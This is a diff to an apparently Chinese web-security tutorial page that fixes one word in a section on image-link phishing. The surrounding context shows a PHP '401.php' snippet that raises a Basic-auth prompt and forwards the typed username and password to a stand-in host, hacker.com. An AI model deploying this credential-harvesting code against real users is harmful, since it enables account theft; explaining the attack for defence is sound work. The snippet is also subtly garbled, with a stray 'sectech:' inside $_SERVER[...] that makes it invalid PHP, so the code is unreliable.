@@ -234,7 +234,7 @@ CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全
 <h3 id="图片钓鱼"><a class="markdown-anchor" href="#图片钓鱼">#</a> 图片钓鱼</h3>
 <p>如果可以允许用户向网页里插入未经验证的外链图片，这有可能出现钓鱼风险。</p>
 <p>比如常见的 <code>401钓鱼</code>, 攻击者在访问页面时，页面弹出验证页面让用户输入帐号及密码，当用户输入之后，帐号及密码就存储到了黑客的服务器中。
-通常这种情况会出现在<code>&lt;img src=$url /&gt;</code>中，系统不对<code>$url</code>是否在域名白名单哪进行校验。</p>
+通常这种情况会出现在<code>&lt;img src=$url /&gt;</code>中，系统不对<code>$url</code>是否在域名白名单内进行校验。</p>
 <p>攻击者可以在自己的服务器中构造以下代码：</p>
 <p>401.php：作用为弹出 401 窗口，并且记录用户信息。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    header(<span class="string">'WWW-Authenticate: Basic realm="No authorization"'</span>);</div><div class="line">    header(<span class="string">'HTTP/1.1 401 Unauthorized'</span>);</div><div class="line">        $domain = <span class="string">"http://hacker.com/fishing/"</span>;</div><div class="line">        <span class="keyword">if</span> ($_SERVER[sectech:<span class="string">'PHP_AUTH_USER'</span>] !== <span class="keyword">null</span>)&#123;</div><div class="line">                header(<span class="string">"Location: "</span>.$domain.<span class="string">"record.php?a="</span>.$_SERVER[sectech:<span class="string">'PHP_AUTH_USER'</span>].<span class="string">"&amp;b="</span>.$_SERVER[sectech:<span class="string">'PHP_AUTH_PW'</span>]);</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
